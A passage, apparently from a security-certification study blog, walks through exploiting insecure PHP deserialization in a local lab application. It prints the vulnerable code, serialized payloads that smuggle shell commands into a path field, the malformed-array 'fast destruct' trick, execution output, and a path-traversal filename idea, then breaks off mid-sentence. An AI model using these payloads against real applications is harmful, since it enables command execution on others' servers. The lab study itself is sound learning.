<div class="language-php highlighter-rouge"><div class="code-header">
        <span data-label-text="PHP"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre></td><td class="rouge-code"><pre>    <span class="k">if</span><span class="p">(</span><span class="nv">$session</span><span class="o">-&gt;</span><span class="nf">isAuth</span><span class="p">())</span> <span class="p">{</span>
        <span class="k">echo</span> <span class="s2">"está autenticado"</span><span class="p">;</span>
        <span class="k">echo</span> <span class="s2">"&lt;br&gt;"</span><span class="p">;</span>

        <span class="nv">$fileManager</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">FileManager</span><span class="p">();</span>
        <span class="nv">$fileManager</span><span class="o">-&gt;</span><span class="nf">putlog</span><span class="p">(</span><span class="s2">"Sessão iniciada no File Manager!"</span><span class="p">);</span>
        <span class="nv">$log</span> <span class="o">=</span> <span class="nv">$fileManager</span><span class="o">-&gt;</span><span class="nf">readLog</span><span class="p">();</span>
        <span class="k">echo</span> <span class="nv">$log</span><span class="p">;</span>
    <span class="p">}</span> 
</pre></td></tr></tbody></table></code></div></div>

<p>So after enter in the page with the session cookie, we can that that he created an file and then he deletes it.</p>

<div class="language-php highlighter-rouge"><div class="code-header">
        <span data-label-text="PHP"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre></td><td class="rouge-code"><pre><span class="err">┌──</span><span class="p">(</span><span class="n">kali</span><span class="err">㉿</span><span class="n">kali</span><span class="p">)</span><span class="o">-</span><span class="p">[</span><span class="o">~/</span><span class="err">…</span><span class="o">/</span><span class="n">eWPTX</span><span class="o">/</span><span class="n">serialization</span><span class="o">/</span><span class="n">insegura</span><span class="o">/</span><span class="n">tmp</span><span class="p">]</span>
<span class="err">└─$</span> <span class="n">ls</span> <span class="o">-</span><span class="n">la</span> 
<span class="n">total</span> <span class="mi">12</span>
<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">2</span> <span class="n">kali</span> <span class="n">kali</span> <span class="mi">4096</span> <span class="nc">Jul</span> <span class="mi">25</span> <span class="mi">15</span><span class="o">:</span><span class="mi">52</span> <span class="mf">.</span>
<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">5</span> <span class="n">kali</span> <span class="n">kali</span> <span class="mi">4096</span> <span class="nc">Jul</span> <span class="mi">25</span> <span class="mi">15</span><span class="o">:</span><span class="mi">18</span> <span class="mf">..</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span> <span class="mi">1</span> <span class="n">kali</span> <span class="n">kali</span>   <span class="mi">33</span> <span class="nc">Jul</span> <span class="mi">25</span> <span class="mi">15</span><span class="o">:</span><span class="mi">52</span> <span class="n">log</span><span class="mf">.</span><span class="n">txt</span>
                                                                                                                                                                               
<span class="err">┌──</span><span class="p">(</span><span class="n">kali</span><span class="err">㉿</span><span class="n">kali</span><span class="p">)</span><span class="o">-</span><span class="p">[</span><span class="o">~/</span><span class="err">…</span><span class="o">/</span><span class="n">eWPTX</span><span class="o">/</span><span class="n">serialization</span><span class="o">/</span><span class="n">insegura</span><span class="o">/</span><span class="n">tmp</span><span class="p">]</span>
<span class="err">└─$</span> <span class="n">cat</span> <span class="n">log</span><span class="mf">.</span><span class="n">txt</span>  
<span class="nc">Sessão</span> <span class="n">iniciada</span> <span class="n">no</span> <span class="nc">File</span> <span class="nc">Manager</span><span class="o">!</span>                                                                                                                                                                               
</pre></td></tr></tbody></table></code></div></div>

<p>So in this specific function in the File Manager, we have a possible command injection vulnerability.</p>

<div class="language-php highlighter-rouge"><div class="code-header">
        <span data-label-text="PHP"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre>    <span class="k">public</span> <span class="k">function</span> <span class="n">__destruct</span><span class="p">()</span> <span class="p">{</span>
        <span class="nb">shell_exec</span><span class="p">(</span><span class="s2">"rm -rf "</span> <span class="mf">.</span> <span class="nb">escapeshellarg</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">path</span><span class="p">)</span> <span class="mf">.</span> <span class="s2">"*"</span><span class="p">);</span>
    <span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div>

<p>This happens because it takes a variable from the <code class="language-plaintext highlighter-rouge">FileManager</code> class, in this case, the <code class="language-plaintext highlighter-rouge">path</code>. When unserializing:</p>

<div class="language-php highlighter-rouge"><div class="code-header">
        <span data-label-text="PHP"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>    <span class="nv">$session</span> <span class="o">=</span> <span class="nb">unserialize</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">'session'</span><span class="p">]);</span>

</pre></td></tr></tbody></table></code></div></div>

<p>The code does NOT validate which object is being deserialized, so instead of passing the serialized “Auth” object, one could pass the <code class="language-plaintext highlighter-rouge">FileManager</code> object:</p>

<div class="language-php highlighter-rouge"><div class="code-header">
        <span data-label-text="PHP"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="nc">O</span><span class="o">:</span><span class="mi">11</span><span class="o">:</span><span class="s2">"Filemanager"</span><span class="o">:</span><span class="mi">1</span><span class="o">:</span><span class="p">{</span><span class="n">s</span><span class="o">:</span><span class="mi">4</span><span class="o">:</span><span class="s2">"path"</span><span class="p">;</span><span class="n">s</span><span class="o">:</span><span class="mi">25</span><span class="o">:</span><span class="s2">"/tmp/auth; sleep 5; echo "</span><span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div>

<p>Then, after encoding and sending it to the server, the following error occurs:</p>

<div class="language-php highlighter-rouge"><div class="code-header">
        <span data-label-text="PHP"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre></td><td class="rouge-code"><pre><span class="p">[</span><span class="nc">Thu</span> <span class="nc">Jul</span> <span class="mi">25</span> <span class="mi">16</span><span class="o">:</span><span class="mi">18</span><span class="o">:</span><span class="mi">27</span> <span class="mi">2024</span><span class="p">]</span> <span class="mf">127.0.0.1</span><span class="o">:</span><span class="mi">42376</span> <span class="nc">Accepted</span>
<span class="p">[</span><span class="nc">Thu</span> <span class="nc">Jul</span> <span class="mi">25</span> <span class="mi">16</span><span class="o">:</span><span class="mi">18</span><span class="o">:</span><span class="mi">27</span> <span class="mi">2024</span><span class="p">]</span> <span class="no">PHP</span> <span class="nc">Notice</span><span class="o">:</span>  <span class="nb">unserialize</span><span class="p">()</span><span class="o">:</span> <span class="nc">Error</span> <span class="n">at</span> <span class="n">offset</span> <span class="mi">65</span> <span class="n">of</span> <span class="mi">66</span> <span class="n">bytes</span> <span class="n">in</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">kali</span><span class="o">/</span><span class="nc">Desktop</span><span class="o">/</span><span class="n">eWPTX</span><span class="o">/</span><span class="n">serialization</span><span class="o">/</span><span class="n">insegura</span><span class="o">/</span><span class="n">index</span><span class="mf">.</span><span class="n">php</span> <span class="n">on</span> <span class="n">line</span> <span class="mi">6</span>
<span class="p">[</span><span class="nc">Thu</span> <span class="nc">Jul</span> <span class="mi">25</span> <span class="mi">16</span><span class="o">:</span><span class="mi">18</span><span class="o">:</span><span class="mi">27</span> <span class="mi">2024</span><span class="p">]</span> <span class="no">PHP</span> <span class="nc">Fatal</span> <span class="n">error</span><span class="o">:</span>  <span class="nc">Uncaught</span> <span class="nc">Error</span><span class="o">:</span> <span class="nc">Call</span> <span class="n">to</span> <span class="n">a</span> <span class="n">member</span> <span class="k">function</span> <span class="n">isAuth</span><span class="p">()</span> <span class="kt">on</span> <span class="n">bool</span> <span class="n">in</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">kali</span><span class="o">/</span><span class="nc">Desktop</span><span class="o">/</span><span class="n">eWPTX</span><span class="o">/</span><span class="n">serialization</span><span class="o">/</span><span class="n">insegura</span><span class="o">/</span><span class="n">index</span><span class="mf">.</span><span class="n">php</span><span class="o">:</span><span class="mi">8</span>
<span class="nc">Stack</span> <span class="n">trace</span><span class="o">:</span>
<span class="c1">#0 {main}</span>
  <span class="n">thrown</span> <span class="n">in</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">kali</span><span class="o">/</span><span class="nc">Desktop</span><span class="o">/</span><span class="n">eWPTX</span><span class="o">/</span><span class="n">serialization</span><span class="o">/</span><span class="n">insegura</span><span class="o">/</span><span class="n">index</span><span class="mf">.</span><span class="n">php</span> <span class="n">on</span> <span class="n">line</span> <span class="mi">8</span>
<span class="p">[</span><span class="nc">Thu</span> <span class="nc">Jul</span> <span class="mi">25</span> <span class="mi">16</span><span class="o">:</span><span class="mi">18</span><span class="o">:</span><span class="mi">27</span> <span class="mi">2024</span><span class="p">]</span> <span class="mf">127.0.0.1</span><span class="o">:</span><span class="mi">42376</span> <span class="p">[</span><span class="mi">500</span><span class="p">]</span><span class="o">:</span> <span class="no">GET</span> <span class="o">/</span> <span class="o">-</span> <span class="nc">Uncaught</span> <span class="nc">Error</span><span class="o">:</span> <span class="nc">Call</span> <span class="n">to</span> <span class="n">a</span> <span class="n">member</span> <span class="k">function</span> <span class="n">isAuth</span><span class="p">()</span> <span class="kt">on</span> <span class="n">bool</span> <span class="n">in</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">kali</span><span class="o">/</span><span class="nc">Desktop</span><span class="o">/</span><span class="n">eWPTX</span><span class="o">/</span><span class="n">serialization</span><span class="o">/</span><span class="n">insegura</span><span class="o">/</span><span class="n">index</span><span class="mf">.</span><span class="n">php</span><span class="o">:</span><span class="mi">8</span>
<span class="nc">Stack</span> <span class="n">trace</span><span class="o">:</span>
<span class="c1">#0 {main}</span>
  <span class="n">thrown</span> <span class="n">in</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">kali</span><span class="o">/</span><span class="nc">Desktop</span><span class="o">/</span><span class="n">eWPTX</span><span class="o">/</span><span class="n">serialization</span><span class="o">/</span><span class="n">insegura</span><span class="o">/</span><span class="n">index</span><span class="mf">.</span><span class="n">php</span> <span class="n">on</span> <span class="n">line</span> <span class="mi">8</span>
</pre></td></tr></tbody></table></code></div></div>

<p>It performs the deserialization and immediately calls the <code class="language-plaintext highlighter-rouge">isAuth()</code> function:</p>

<div class="language-php highlighter-rouge"><div class="code-header">
        <span data-label-text="PHP"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>    <span class="nv">$session</span> <span class="o">=</span> <span class="nb">unserialize</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">'session'</span><span class="p">]);</span>
    <span class="k">if</span><span class="p">(</span><span class="nv">$session</span><span class="o">-&gt;</span><span class="nf">isAuth</span><span class="p">())</span> <span class="p">{</span>
</pre></td></tr></tbody></table></code></div></div>

<p>However, what matters is that since it calls a function from the <code class="language-plaintext highlighter-rouge">session</code>, it does NOT directly call the <code class="language-plaintext highlighter-rouge">FileManager</code> class because it only calls <code class="language-plaintext highlighter-rouge">__destruct</code> when PHP finishes interpreting the class. Therefore, you need a method where PHP forces the <code class="language-plaintext highlighter-rouge">__destruct</code> directly.</p>

<p>Consider the following code:</p>

<div class="language-php highlighter-rouge"><div class="code-header">
        <span data-label-text="PHP"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre></td><td class="rouge-code"><pre><span class="cp">&lt;?php</span>

<span class="kd">class</span> <span class="nc">test</span> <span class="p">{</span>
    <span class="k">public</span> <span class="k">function</span> <span class="n">__destruct</span><span class="p">()</span> <span class="p">{</span>
        <span class="k">echo</span> <span class="s2">"test"</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="nv">$wtf</span> <span class="o">=</span> <span class="nb">unserialize</span><span class="p">(</span><span class="s1">'a:2:{i:7;O:4:"test":0:{}i:7;i:7;}'</span><span class="p">);</span>
<span class="nv">$wtf</span><span class="o">-&gt;</span><span class="nf">test</span><span class="p">();</span>

<span class="cp">?&gt;</span>
</pre></td></tr></tbody></table></code></div></div>

<p>We have an array with two positions <code class="language-plaintext highlighter-rouge">a:2</code>; the first position is named <code class="language-plaintext highlighter-rouge">7</code> and its value is an object <code class="language-plaintext highlighter-rouge">0:4:"Test":0:{}</code>. However, it is not specified at the end of the function that it will initiate another object <code class="language-plaintext highlighter-rouge">{}i</code> (usually there is a <code class="language-plaintext highlighter-rouge">;</code> at the end, making it <code class="language-plaintext highlighter-rouge">{};i</code>). When running, it indicates that the encoding is incorrect, but even so, it executes the value <code class="language-plaintext highlighter-rouge">test</code>.</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td><td class="rouge-code"><pre>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Desktop/eWPTX/serialization/insegura]
└─<span class="nv">$ </span>php test.php              
testPHP Fatal error:  Uncaught Error: Call to a member <span class="k">function </span><span class="nb">test</span><span class="o">()</span> on array <span class="k">in</span> /home/kali/Desktop/eWPTX/serialization/insegura/test.php:10
Stack trace:
<span class="c">#0 {main}</span>
  thrown <span class="k">in</span> /home/kali/Desktop/eWPTX/serialization/insegura/test.php on line 10
</pre></td></tr></tbody></table></code></div></div>

<p>This happens because PHP still creates the <code class="language-plaintext highlighter-rouge">Test</code> object before processing the rest of the serialized string. The destructor is called when the object is destroyed, which happens when the deserialization process ends or when the script ends.</p>

<p>But this <strong>ALWAYS</strong> happens when an invalid array value is passed. For example, consider the following request:</p>

<div class="language-php highlighter-rouge"><div class="code-header">
        <span data-label-text="PHP"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre></td><td class="rouge-code"><pre><span class="cp">&lt;?php</span>

<span class="kd">class</span> <span class="nc">test</span> <span class="p">{</span>
    <span class="k">public</span> <span class="k">function</span> <span class="n">__destruct</span><span class="p">()</span> <span class="p">{</span>
        <span class="k">echo</span> <span class="s2">"test 123"</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="k">echo</span> <span class="nb">serialize</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s1">'payload'</span><span class="o">=&gt;</span><span class="k">new</span> <span class="nc">test</span><span class="p">()));</span>
<span class="cp">?&gt;</span>
</pre></td></tr></tbody></table></code></div></div>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="nb">test </span>123a:1:<span class="o">{</span>s:7:<span class="s2">"payload"</span><span class="p">;</span>O:4:<span class="s2">"test"</span>:0:<span class="o">{}}</span>                                                                                                                                                                               
</pre></td></tr></tbody></table></code></div></div>

<p>Assigning this to the unserialized variable</p>

<div class="language-php highlighter-rouge"><div class="code-header">
        <span data-label-text="PHP"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre><span class="nv">$wtf</span> <span class="o">=</span> <span class="nb">unserialize</span><span class="p">(</span><span class="s1">'a:1:{s:7:"payload";O:4:"test":0:{}}'</span><span class="p">);</span>
<span class="nv">$wtf</span><span class="o">-&gt;</span><span class="nf">test</span><span class="p">();</span>
</pre></td></tr></tbody></table></code></div></div>

<p>It will give an error because the <code class="language-plaintext highlighter-rouge">test</code> function does not exist, which is correct.</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td><td class="rouge-code"><pre>──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Desktop/eWPTX/serialization/insegura]
└─<span class="nv">$ </span>php test.php
PHP Fatal error:  Uncaught Error: Call to a member <span class="k">function </span><span class="nb">test</span><span class="o">()</span> on array <span class="k">in</span> /home/kali/Desktop/eWPTX/serialization/insegura/test.php:10
Stack trace:
<span class="c">#0 {main}</span>
  thrown <span class="k">in</span> /home/kali/Desktop/eWPTX/serialization/insegura/test.php on line 10
</pre></td></tr></tbody></table></code></div></div>

<p>However, if we change the array size value:</p>

<div class="language-php highlighter-rouge"><div class="code-header">
        <span data-label-text="PHP"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="nv">$wtf</span> <span class="o">=</span> <span class="nb">unserialize</span><span class="p">(</span><span class="s1">'a:2:{s:7:"payload";O:4:"test":0:{}}'</span><span class="p">);</span>
</pre></td></tr></tbody></table></code></div></div>

<p>The <code class="language-plaintext highlighter-rouge">__destruct</code> command is executed:</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre></td><td class="rouge-code"><pre>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Desktop/eWPTX/serialization/insegura]
└─<span class="nv">$ </span>php test.php
PHP Notice:  unserialize<span class="o">()</span>: Unexpected end of serialized data <span class="k">in</span> /home/kali/Desktop/eWPTX/serialization/insegura/test.php on line 9
PHP Notice:  unserialize<span class="o">()</span>: Error at offset 34 of 35 bytes <span class="k">in</span> /home/kali/Desktop/eWPTX/serialization/insegura/test.php on line 9
<span class="k">**</span><span class="nb">test </span>123<span class="k">**</span>PHP Fatal error:  Uncaught Error: Call to a member <span class="k">function </span><span class="nb">test</span><span class="o">()</span> on bool <span class="k">in</span> /home/kali/Desktop/eWPTX/serialization/insegura/test.php:10
Stack trace:
<span class="c">#0 {main}</span>
  thrown <span class="k">in</span> /home/kali/Desktop/eWPTX/serialization/insegura/test.php on line 10
</pre></td></tr></tbody></table></code></div></div>

<p>Now, adapting this to the previously worked application scenario:</p>

<p><strong>exploit-fast-destruct.php</strong></p>

<div class="language-php highlighter-rouge"><div class="code-header">
        <span data-label-text="PHP"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre></td><td class="rouge-code"><pre><span class="cp">&lt;?php</span>

<span class="kd">class</span> <span class="nc">FileManager</span> <span class="p">{</span>
    <span class="k">public</span> <span class="nv">$path</span> <span class="o">=</span> <span class="s2">"/tmp/aula;sleep 5; echo "</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">echo</span> <span class="nb">serialize</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s1">'payload'</span><span class="o">=&gt;</span><span class="k">new</span> <span class="nc">FileManager</span><span class="p">()));</span>
<span class="cp">?&gt;</span>
</pre></td></tr></tbody></table></code></div></div>

<p>Then change it to two positions and encode it.</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>a:2:<span class="o">{</span>s:7:<span class="s2">"payload"</span><span class="p">;</span>O:11:<span class="s2">"FileManager"</span>:1:<span class="o">{</span>s:4:<span class="s2">"path"</span><span class="p">;</span>s:25:<span class="s2">"/tmp/aula/;sleep 5; echo "</span><span class="p">;</span><span class="o">}}</span>
</pre></td></tr></tbody></table></code></div></div>

<p>We can see that it worked because it waited 5 seconds:</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre></td><td class="rouge-code"><pre><span class="o">[</span>Thu Jul 25 17:00:30 2024] PHP Fatal error:  Uncaught Error: Call to a member <span class="k">function </span>isAuth<span class="o">()</span> on array <span class="k">in</span> /home/kali/Desktop/eWPTX/serialization/insegura/index.php:8
Stack trace:
<span class="c">#0 {main}</span>
  thrown <span class="k">in</span> /home/kali/Desktop/eWPTX/serialization/insegura/index.php on line 8
<span class="o">[</span>Thu Jul 25 17:00:30 2024] 127.0.0.1:53154 <span class="o">[</span>500]: GET / - Uncaught Error: Call to a member <span class="k">function </span>isAuth<span class="o">()</span> on array <span class="k">in</span> /home/kali/Desktop/eWPTX/serialization/insegura/index.php:8
Stack trace:
<span class="c">#0 {main}</span>
  thrown <span class="k">in</span> /home/kali/Desktop/eWPTX/serialization/insegura/index.php on line 8
<span class="o">[</span>Thu Jul 25 17:00:35 2024] 127.0.0.1:53154 Closing
<span class="o">[</span>Thu Jul 25 17:00:35 2024] 127.0.0.1:53162 Accepted

</pre></td></tr></tbody></table></code></div></div>

<p>Now you need to modify the exploit to create a file, for example:</p>

<div class="language-php highlighter-rouge"><div class="code-header">
        <span data-label-text="PHP"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="k">public</span> <span class="nv">$path</span> <span class="o">=</span> <span class="s2">"/tmp/aula;id&gt;/tmp/path; echo "</span><span class="p">;</span>
</pre></td></tr></tbody></table></code></div></div>

<p>Sending the payload:</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>a:2:<span class="o">{</span>s:7:<span class="s2">"payload"</span><span class="p">;</span>O:11:<span class="s2">"FileManager"</span>:1:<span class="o">{</span>s:4:<span class="s2">"path"</span><span class="p">;</span>s:29:<span class="s2">"/tmp/aula;id&gt;/tmp/path; echo "</span><span class="p">;</span><span class="o">}}</span> 
</pre></td></tr></tbody></table></code></div></div>

<p>Checking the file, it was possible to execute commands:</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[/tmp]
└─<span class="nv">$ </span><span class="nb">cat </span>path         
<span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>kali<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>kali<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1000<span class="o">(</span>kali<span class="o">)</span>,4<span class="o">(</span>adm<span class="o">)</span>,20<span class="o">(</span>dialout<span class="o">)</span>,24<span class="o">(</span>cdrom<span class="o">)</span>,25<span class="o">(</span>floppy<span class="o">)</span>,27<span class="o">(</span><span class="nb">sudo</span><span class="o">)</span>,29<span class="o">(</span>audio<span class="o">)</span>,30<span class="o">(</span>dip<span class="o">)</span>,44<span class="o">(</span>video<span class="o">)</span>,46<span class="o">(</span>plugdev<span class="o">)</span>,100<span class="o">(</span><span class="nb">users</span><span class="o">)</span>,106<span class="o">(</span>netdev<span class="o">)</span>,111<span class="o">(</span>bluetooth<span class="o">)</span>,116<span class="o">(</span>scanner<span class="o">)</span>,138<span class="o">(</span>wireshark<span class="o">)</span>,141<span class="o">(</span>kaboxer<span class="o">)</span>
</pre></td></tr></tbody></table></code></div></div>

<p>If the <code class="language-plaintext highlighter-rouge">__destruct</code> is in the following format:</p>

<div class="language-php highlighter-rouge"><div class="code-header">
        <span data-label-text="PHP"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre></td><td class="rouge-code"><pre><span class="k">public</span> <span class="k">function</span> <span class="n">isAuth</span><span class="p">(){</span>
    <span class="k">if</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">auth</span><span class="p">){</span>
        <span class="k">return</span> <span class="kc">true</span><span class="p">;</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
	      <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="k">public</span> <span class="k">function</span> <span class="n">__destruct</span><span class="p">()</span> <span class="p">{</span>
    <span class="k">if</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">role</span> <span class="o">==</span> <span class="s2">"admin"</span><span class="p">){</span>
        <span class="nb">file_put_contents</span><span class="p">(</span><span class="s2">"/tmp/"</span><span class="mf">.</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">username</span><span class="p">,</span> <span class="nb">serialize</span><span class="p">(</span><span class="nv">$this</span><span class="p">));</span>
    <span class="p">}</span>
<span class="p">}</span>

</pre></td></tr></tbody></table></code></div></div>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>O:4:<span class="s2">"Auth"</span>:3:<span class="o">{</span>s:4:<span class="s2">"auth"</span><span class="p">;</span>i:1:<span class="s2">"guest"</span><span class="p">;</span>s:5:<span class="s2">"admin"</span><span class="p">;</span>s:4:<span class="s2">"role"</span><span class="p">;</span>s:5:<span class="s2">"admin"</span><span class="p">;</span>s:4<span class="p">;</span><span class="o">}</span>
</pre></td></tr></tbody></table></code></div></div>

<p>In this case, it writes the content of the current class into a file. There are two vulnerabilities:</p>

<p>If the username is <code class="language-plaintext highlighter-rouge">../../var/www/html/test.php</code>, it will create this file with just the class content. However, if you put it this way, it will only write the class content.</p>

<p>Another thing is, since it uses the comparison <code class="language-plaintext highlighter-rouge">if($this-&gt;auth)</code>, this is equivalent to <code class="language-plaintext highlighter-rouge">if($this != 0 || $this != NULL)</code>, meaning we could modify the content</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
